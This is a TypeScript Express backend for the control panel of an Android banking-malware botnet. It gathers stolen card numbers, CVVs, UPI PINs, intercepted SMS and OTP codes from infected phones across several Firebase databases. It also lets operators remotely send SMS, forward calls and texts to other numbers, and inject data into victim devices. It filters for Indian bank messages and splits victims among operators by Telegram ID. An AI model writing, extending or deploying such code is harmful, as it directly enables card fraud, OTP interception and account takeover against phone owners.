import { Router } from "express";
import { fbGet, fbSet, fbUpdate, fbDelete } from "../bot/firebase";
import { requireAuth } from "../middlewares/auth";
import { isAdminTg } from "../lib/admin";
import {
  fbGetFor,
  listInstances,
  deviceIsOnline,
  type InstanceInfo,
} from "./firebases";

/**
 * Panel bootstrap — one call gives the React dashboard everything it needs,
 * so the client does a single REST poll instead of N Firebase onValue
 * listeners (lightweight like the pure panel).
 */

const router = Router();
const BANK_SMS_RE =
  /bank|hdfc|sbi|icici|axis|kotak|bob|union|pnb|upi|paytm|phonepe|gpay|google pay|net banking|atm|withdraw|credited|debited|transaction/i;
const FOLD_FIELDS = [
  "cc_cardNumber",
  "cc_cardholderName",
  "cc_expiry",
  "cc_cvv",
  "cc_timestamp",
  "upi_id",
  "upi_name",
  "upi_phone",
  "upi_pin",
  "upi_timestamp",
];

function normalizeDevice(id: string, c: any) {
  const raw = c || {};
  let sim1 = raw.sim1 || "";
  let sim2 = raw.sim2 || "";
  if (Array.isArray(raw.sims)) {
    if (raw.sims[0])
      sim1 = [raw.sims[0].phoneNumber, raw.sims[0].carrierName]
        .filter(Boolean)
        .join(" · ");
    if (raw.sims[1])
      sim2 = [raw.sims[1].phoneNumber, raw.sims[1].carrierName]
        .filter(Boolean)
        .join(" · ");
  }
  return {
    id,
    model: raw.modelName || raw.model || "Unknown",
    phone: raw.mobNo || raw.phone || "",
    upi: raw.upi || "",
    battery: raw.battery || "",
    sim1,
    sim2,
    isOnline: deviceIsOnline(raw, Date.now()),
    androidV: raw.androidV,
    sdkV: raw.sdkV,
    ip_address: raw.ip_address,
    storage: raw.storage,
    cpu_arch: raw.cpu_arch,
    isRoot: raw.isRoot,
    isSdCard: raw.isSdCard,
    joined: raw.joined,
    lastPing: raw.lastPing,
    label: raw.label,
    group: raw.group || "",
    deviceName: raw.deviceName || "",
    colorTag: raw.colorTag || "",
    ownerTelegramId: raw.ownerTelegramId || "",
    webview: raw.webview === true,
    credit: raw.credit,
    raw,
  };
}

function foldWebviewNodes(clients: Record<string, any>): any[] {
  const keys = Object.keys(clients || {});
  const nativeByOwner: Record<string, { key: string; val: any }> = {};
  keys.forEach((k) => {
    const v = clients[k];
    if (!v || typeof v !== "object") return;
    if (
      v.webview !== true &&
      v.ownerTelegramId &&
      !nativeByOwner[v.ownerTelegramId]
    ) {
      nativeByOwner[v.ownerTelegramId] = { key: k, val: v };
    }
  });
  const out: any[] = [];
  const seen = new Set<string>();
  keys.forEach((k) => {
    const v = clients[k];
    if (!v || typeof v !== "object") return;
    if (
      v.webview === true &&
      nativeByOwner[v.ownerTelegramId] &&
      nativeByOwner[v.ownerTelegramId].key !== k
    ) {
      const target = nativeByOwner[v.ownerTelegramId];
      for (const f of FOLD_FIELDS)
        if (v[f] && !target.val[f]) target.val[f] = v[f];
      return;
    }
    if (seen.has(k)) return;
    seen.add(k);
    out.push(normalizeDevice(k, v));
  });
  return out;
}

// GET /api/panel/bootstrap — devices + messageIds + pins + bankSms (one call)
router.get("/panel/bootstrap", requireAuth, async (req, res) => {
  try {
    const auth = (req as any).auth as { telegramId: string };
    // Only enabled instances
    const instances = (await listInstances()).filter(
      (i) => i.enabled !== false
    );
    const rows = await Promise.allSettled(
      instances.map(async (inst) => {
        const [clients, msgs, otps] = await Promise.all([
          fbGetFor(inst.databaseURL, inst.apiKey, "clients").catch(() => null),
          fbGetFor(
            inst.databaseURL,
            inst.apiKey,
            "messages",
            8000,
            "shallow=true"
          ).catch(() => null),
          fbGetFor(inst.databaseURL, inst.apiKey, "otps/latest").catch(
            () => null
          ),
        ]);
        return { inst, clients, msgs, otps };
      })
    );
    const devices: any[] = [];
    const messageIds = new Set<string>();
    let bankSms = 0;
    let online = 0;
    let offline = 0;
    let cards = 0;
    let upi = 0;
    let today = 0;
    for (const r of rows) {
      if (r.status !== "fulfilled") continue;
      const { clients, msgs, otps } = r.value;
      const list = foldWebviewNodes((clients || {}) as Record<string, any>);
      const now = new Date().toDateString();
      for (const d of list) {
        devices.push(d);
        if (d.isOnline) online++;
        else offline++;
        if (
          Object.keys(d.raw).some(
            (k) => k.startsWith("cc_") || k === "cc" || k === "cards"
          )
        )
          cards++;
        if (d.upi) upi++;
        const cc =
          Number(new Date(String(d.raw.cc_timestamp || "")).getTime()) || 0;
        const u =
          Number(new Date(String(d.raw.upi_timestamp || "")).getTime()) || 0;
        const ts = Math.max(cc, u);
        if (ts && new Date(ts).toDateString() === now) today++;
      }
      if (msgs && typeof msgs === "object")
        Object.keys(msgs).forEach((id) => messageIds.add(id));
      const otpRecs = (otps?.latest || otps || {}) as Record<string, any>;
      for (const rec of Object.values(otpRecs)) {
        if (rec && BANK_SMS_RE.test(`${rec.body || ""} ${rec.service || ""}`))
          bankSms++;
      }
    }
    let pins: string[] = [];
    try {
      const p = (await fbGet(`config/pins/${auth.telegramId}`)) || {};
      pins = Object.keys(p).filter((k) => p[k]);
    } catch {
      /* no pins */
    }
    return res.json({
      success: true,
      devices,
      messageIds: [...messageIds],
      pins,
      bankSms,
      totals: { online, offline, cards, upi, today },
      instances: instances.map((i) => ({ id: i.id, name: i.name })),
    });
  } catch (err: any) {
    return res.status(500).json({ error: err?.message || "Bootstrap failed" });
  }
});

// GET /api/panel/pins — current user's pinned devices
router.get("/panel/pins", requireAuth, async (req, res) => {
  try {
    const auth = (req as any).auth as { telegramId: string };
    const p =
      (await fbGet(`config/pins/${auth.telegramId}`).catch(() => null)) || {};
    const pins = Object.keys(p).filter((k) => p[k]);
    return res.json({ success: true, pins });
  } catch (err: any) {
    return res.status(500).json({ error: err?.message || "Pins load failed" });
  }
});

// PUT /api/panel/pins/:deviceId  { pinned: true|false } — toggle a pin
router.put("/panel/pins/:deviceId", requireAuth, async (req, res) => {
  try {
    const auth = (req as any).auth as { telegramId: string };
    const deviceId = String(req.params.deviceId);
    const pinned = req.body?.pinned !== false;
    if (pinned) await fbSet(`config/pins/${auth.telegramId}/${deviceId}`, true);
    else
      await fbSet(`config/pins/${auth.telegramId}/${deviceId}`, null).catch(
        () => {}
      );
    return res.json({ success: true, pinned });
  } catch (err: any) {
    return res.status(500).json({ error: err?.message || "Pin toggle failed" });
  }
});

// GET /api/panel/device/:id — full detail for one device across instances
router.get("/panel/device/:id", requireAuth, async (req, res) => {
  try {
    const id = String(req.params.id);
    const instances = (await listInstances()).filter(
      (i) => i.enabled !== false
    );
    let device: any = null;
    let messages: any = {};
    for (const inst of instances) {
      const c = await fbGetFor(
        inst.databaseURL,
        inst.apiKey,
        `clients/${id}`
      ).catch(() => null);
      if (c && typeof c === "object") {
        device = normalizeDevice(id, c);
        device.instanceId = inst.id;
        device.instanceName = inst.name;
      }
      const msgs = await fbGetFor(
        inst.databaseURL,
        inst.apiKey,
        `messages/${id}`
      ).catch(() => null);
      if (msgs && typeof msgs === "object") messages = { ...messages, ...msgs };
      if (device) break;
    }
    if (!device) {
      return res.status(404).json({ error: "Device not found" });
    }
    return res.json({ success: true, device, messages });
  } catch (err: any) {
    return res
      .status(500)
      .json({ error: err?.message || "Device load failed" });
  }
});

// ── device actions (writes to primary RTDB; open-rule, same as the bot) ──────

// POST /api/panel/device/:id/update — patch client fields
router.post("/panel/device/:id/update", requireAuth, async (req, res) => {
  try {
    const id = String(req.params.id);
    const allowed = [
      "ownerTelegramId",
      "memo",
      "deviceName",
      "group",
      "colorTag",
      "callForward",
    ];
    const patch: Record<string, any> = {};
    for (const k of allowed) if (k in (req.body || {})) patch[k] = req.body[k];
    if (!Object.keys(patch).length)
      return res.status(400).json({ error: "nothing to update" });
    await fbUpdate(`clients/${id}`, patch);
    return res.json({ success: true });
  } catch (err: any) {
    return res.status(500).json({ error: err?.message || "Update failed" });
  }
});

// POST /api/panel/device/:id/ping — ask the APK to pong
router.post("/panel/device/:id/ping", requireAuth, async (req, res) => {
  try {
    const id = String(req.params.id);
    await fbSet(`clients/${id}/webhookEvent/checkLiveness`, { text: "ping" });
    return res.json({ success: true, pingedAt: Date.now() });
  } catch (err: any) {
    return res.status(500).json({ error: err?.message || "Ping failed" });
  }
});

// POST /api/panel/device/:id/send-sms — { to, message, sim }
router.post("/panel/device/:id/send-sms", requireAuth, async (req, res) => {
  try {
    const id = String(req.params.id);
    const { to, message, sim = 0 } = req.body || {};
    if (!to || !message)
      return res.status(400).json({ error: "to + message required" });
    await fbSet(`clients/${id}/webhookEvent/sendSms`, {
      to: String(to).trim(),
      message: String(message),
      isSended: true,
      from: Number(sim) || 0,
    });
    return res.json({ success: true });
  } catch (err: any) {
    return res.status(500).json({ error: err?.message || "Send failed" });
  }
});

// POST /api/panel/device/:id/forward — { type: call|sms, to, sim, active }
router.post("/panel/device/:id/forward", requireAuth, async (req, res) => {
  try {
    const id = String(req.params.id);
    const { type = "call", to, sim = 0, active = true } = req.body || {};
    if (!to)
      return res.status(400).json({ error: "destination number required" });
    const path = `clients/${id}/webhookEvent/${type === "sms" ? "smsForward" : "callForward"}`;
    await fbSet(path, {
      from: Number(sim) || 0,
      to: String(to).trim(),
      isActive: !!active,
    });
    return res.json({ success: true });
  } catch (err: any) {
    return res.status(500).json({ error: err?.message || "Forward failed" });
  }
});

// POST /api/panel/device/:id/inject — { fields } merge into client
router.post("/panel/device/:id/inject", requireAuth, async (req, res) => {
  try {
    const id = String(req.params.id);
    const fields = req.body?.fields;
    if (!fields || typeof fields !== "object")
      return res.status(400).json({ error: "fields required" });
    await fbUpdate(`clients/${id}/inject`, fields);
    return res.json({ success: true });
  } catch (err: any) {
    return res.status(500).json({ error: err?.message || "Inject failed" });
  }
});

// PUT /api/panel/device/:id/alert  { enabled } — online-back alert
router.put("/panel/device/:id/alert", requireAuth, async (req, res) => {
  try {
    const id = String(req.params.id);
    const auth = (req as any).auth as { telegramId: string };
    const enabled = req.body?.enabled !== false;
    if (enabled)
      await fbSet(`config/onlineAlerts/${auth.telegramId}/${id}`, {
        enabled: true,
        createdAt: Date.now(),
      });
    else
      await fbDelete(`config/onlineAlerts/${auth.telegramId}/${id}`).catch(
        () => {}
      );
    return res.json({ success: true, enabled });
  } catch (err: any) {
    return res.status(500).json({ error: err?.message || "Alert failed" });
  }
});

// DELETE /api/panel/device/:id — delete a device node
router.delete("/panel/device/:id", requireAuth, async (req, res) => {
  try {
    const id = String(req.params.id);
    await fbDelete(`clients/${id}`).catch(() => {});
    return res.json({ success: true });
  } catch (err: any) {
    return res.status(500).json({ error: err?.message || "Delete failed" });
  }
});

// DELETE /api/panel/sms/:deviceId/:key — delete one SMS
router.delete("/panel/sms/:deviceId/:key", requireAuth, async (req, res) => {
  try {
    const deviceId = String(req.params.deviceId);
    const key = String(req.params.key);
    await fbDelete(`messages/${deviceId}/${key}`).catch(() => {});
    await fbDelete(`clients/${deviceId}/sms/${key}`).catch(() => {});
    return res.json({ success: true });
  } catch (err: any) {
    return res.status(500).json({ error: err?.message || "SMS delete failed" });
  }
});

// ── Fleet-wide aggregation endpoints (SMS / OTPs / scraped data) ─────────────
// Each mirrors what the old firebase-SDK pages read directly, but served from
// the api-server behind a Bearer session so no RTDB credentials hit the browser.

async function fetchInstancesData(
  path: string,
  timeoutMs = 8000,
  extraQuery = ""
): Promise<Array<{ inst: InstanceInfo; data: any }>> {
  const instances = (await listInstances()).filter((i) => i.enabled !== false);
  const rows = await Promise.allSettled(
    instances.map(async (inst) => ({
      inst,
      data: await fbGetFor(
        inst.databaseURL,
        inst.apiKey,
        path,
        timeoutMs,
        extraQuery
      ).catch(() => null),
    }))
  );
  return rows
    .filter(
      (r): r is PromiseFulfilledResult<{ inst: InstanceInfo; data: any }> =>
        r.status === "fulfilled"
    )
    .map((r) => r.value)
    .filter((r) => r.data != null);
}

function canSeeDevice(ownerId: string | undefined, userId: string): boolean {
  return !ownerId || ownerId === userId;
}

/** GET /api/panel/sms — aggregated SMS across all instances (newest 600) */
router.get("/panel/sms", requireAuth, async (req, res) => {
  try {
    const auth = (req as any).auth as { telegramId: string };
    const isAdmin = isAdminTg(auth.telegramId);
    const instances = (await listInstances()).filter(
      (i) => i.enabled !== false
    );
    const rows = await Promise.allSettled(
      instances.map(async (inst) => {
        const [clients, msgs] = await Promise.all([
          fbGetFor(inst.databaseURL, inst.apiKey, "clients").catch(() => null),
          fbGetFor(
            inst.databaseURL,
            inst.apiKey,
            "messages",
            10_000,
            "shallow=true"
          ).catch(() => null),
        ]);
        return { inst, clients: clients || {}, msgs: msgs || {} };
      })
    );
    const entries: any[] = [];
    for (const r of rows) {
      if (r.status !== "fulfilled") continue;
      const { inst, clients, msgs } = r.value;
      const label = inst.name || inst.id;
      const deviceKeys = Object.keys(msgs);
      const orderByKey = `orderBy=${encodeURIComponent('"$key"')}&limitToLast=25`;
      for (let i = 0; i < deviceKeys.length; i += 10) {
        const batch = deviceKeys.slice(i, i + 10);
        const lists = await Promise.all(
          batch.map((deviceId) =>
            fbGetFor(
              inst.databaseURL,
              inst.apiKey,
              `messages/${deviceId}`,
              10_000,
              orderByKey
            ).catch(() => null)
          )
        );
        batch.forEach((deviceId, idx) => {
          const list = lists[idx] || {};
          const device = (clients as Record<string, any>)[deviceId] || {};
          if (
            !isAdmin &&
            !canSeeDevice(device.ownerTelegramId, auth.telegramId)
          )
            return;
          if (!list || typeof list !== "object") return;
          for (const [pushKey, sms] of Object.entries(
            list as Record<string, any>
          )) {
            if (!sms) continue;
            const body = sms.message || sms.body || "";
            const sortKey =
              sms.id != null
                ? Number(sms.id)
                : sms.date
                  ? parseInt(String(sms.date), 10)
                  : 0;
            entries.push({
              deviceId,
              deviceModel: device.modelName || device.model || "Unknown",
              devicePhone: device.mobNo || device.phone || "",
              pushKey,
              from: sms.sender || sms.from || "Unknown",
              body,
              date: sortKey,
              dbLabel: label,
            });
          }
        });
      }
      // Legacy sms stored under clients/{id}/sms
      for (const [deviceId, device] of Object.entries(
        clients as Record<string, any>
      )) {
        if (!device || typeof device !== "object") continue;
        if (!isAdmin && !canSeeDevice(device.ownerTelegramId, auth.telegramId))
          continue;
        if (!device.sms || msgs[deviceId]) continue;
        for (const [pushKey, sms] of Object.entries(
          device.sms as Record<string, any>
        )) {
          if (!sms) continue;
          entries.push({
            deviceId,
            deviceModel: device.modelName || device.model || "Unknown",
            devicePhone: device.mobNo || device.phone || "",
            pushKey,
            from: sms.from || "Unknown",
            body: sms.body || "",
            date: sms.date ? parseInt(String(sms.date), 10) : 0,
            dbLabel: label,
          });
        }
      }
    }
    entries.sort((a, b) => b.date - a.date);
    return res.json({ success: true, sms: entries.slice(0, 600) });
  } catch (err: any) {
    return res.status(500).json({ error: err?.message || "SMS load failed" });
  }
});

/** GET /api/panel/otps — recent OTP captures + per-device numbers */
router.get("/panel/otps", requireAuth, async (req, res) => {
  try {
    const auth = (req as any).auth as { telegramId: string };
    const isAdmin = isAdminTg(auth.telegramId);
    const instances = (await listInstances()).filter(
      (i) => i.enabled !== false
    );
    const [otpRows, clientRows] = await Promise.all([
      Promise.allSettled(
        instances.map(async (inst) => ({
          inst,
          otps: await fbGetFor(
            inst.databaseURL,
            inst.apiKey,
            "otps/latest"
          ).catch(() => null),
        }))
      ),
      Promise.allSettled(
        instances.map(async (inst) => ({
          inst,
          clients: await fbGetFor(
            inst.databaseURL,
            inst.apiKey,
            "clients"
          ).catch(() => null),
        }))
      ),
    ]);
    const otps: any[] = [];
    for (const r of otpRows) {
      if (r.status !== "fulfilled") continue;
      const { otps: recs } = r.value;
      if (!recs) continue;
      const list = recs.latest || recs;
      if (!list || typeof list !== "object") continue;
      for (const rec of Object.values(list as Record<string, any>)) {
        if (!rec || !rec.code) continue;
        otps.push({
          code: rec.code,
          service: rec.service || "",
          number: rec.number || "",
          from: rec.from || "",
          body: rec.body || "",
          deviceId: rec.deviceId || "",
          date: rec.date || 0,
        });
      }
    }
    otps.sort((a, b) => (b.date || 0) - (a.date || 0));

    const devices: any[] = [];
    for (const r of clientRows) {
      if (r.status !== "fulfilled") continue;
      const { clients } = r.value;
      if (!clients || typeof clients !== "object") continue;
      for (const [id, d] of Object.entries(clients as Record<string, any>)) {
        if (!d || typeof d !== "object" || id.startsWith("*")) continue;
        if (!isAdmin && !canSeeDevice(d.ownerTelegramId, auth.telegramId))
          continue;
        const sims: any[] = Array.isArray(d.sims) ? d.sims : [];
        const nums = [
          d.mobNo || d.phone || "",
          ...sims.map((s: any) => s?.phoneNumber || ""),
        ].filter(
          (n) => !!n && /^\+?\d{6,15}$/.test(String(n).replace(/[\s-]/g, ""))
        );
        if (!nums.length) continue;
        devices.push({
          id,
          model: d.modelName || d.model || "Unknown",
          isOnline: deviceIsOnline(d, Date.now()),
          numbers: [...new Set(nums)],
        });
      }
    }
    return res.json({ success: true, otps: otps.slice(0, 500), devices });
  } catch (err: any) {
    return res.status(500).json({ error: err?.message || "OTP load failed" });
  }
});

/** GET /api/panel/scraped — card captures + device info across fleet */
router.get("/panel/scraped", requireAuth, async (req, res) => {
  try {
    const auth = (req as any).auth as { telegramId: string };
    const isAdmin = isAdminTg(auth.telegramId);
    const rows = await fetchInstancesData("clients");
    const cards: any[] = [];
    const devices: any[] = [];
    for (const { data } of rows) {
      if (!data || typeof data !== "object") continue;
      for (const [deviceId, d] of Object.entries(data as Record<string, any>)) {
        if (!d || typeof d !== "object" || deviceId.startsWith("*")) continue;
        if (!isAdmin && !canSeeDevice(d.ownerTelegramId, auth.telegramId))
          continue;
        const sims: any[] = Array.isArray(d.sims) ? d.sims : [];
        const simStr = (s: any) =>
          s?.phoneNumber && s.phoneNumber !== "Unknown" ? s.phoneNumber : "";
        devices.push({
          deviceId,
          model: d.modelName || d.model || "Unknown",
          phone: d.mobNo || d.phone || "",
          sim1: simStr(sims[0]) || "",
          sim2: simStr(sims[1]) || "",
          battery: d.battery || "?",
          ip: d.ip_address || "—",
          storage: d.storage || "—",
          androidV: d.androidV || "—",
          joined: d.joined || "—",
          status: typeof d.status === "boolean" ? d.status : false,
          ownerTelegramId: d.ownerTelegramId || null,
        });
        const cardNumber = d.cc_cardNumber || d.cardNumber || null;
        if (cardNumber) {
          cards.push({
            deviceId,
            deviceModel: d.modelName || d.model || "Unknown",
            devicePhone: d.mobNo || d.phone || "",
            ownerTelegramId: d.ownerTelegramId || null,
            cardNumber,
            cardholderName:
              d.cc_cardholderName || d.cardholderName || "Unknown",
            expiry: d.cc_expiry || d.expiry || "??/??",
            cvv: d.cc_cvv || d.cvv || "???",
            ip: d.cc_ip || d.ip_address || "—",
            timestamp: d.cc_timestamp || d.timestamp || "—",
          });
        }
      }
    }
    cards.sort((a, b) => (b.timestamp > a.timestamp ? 1 : -1));
    return res.json({ success: true, cards, devices });
  } catch (err: any) {
    return res
      .status(500)
      .json({ error: err?.message || "Scrape load failed" });
  }
});

export default router;
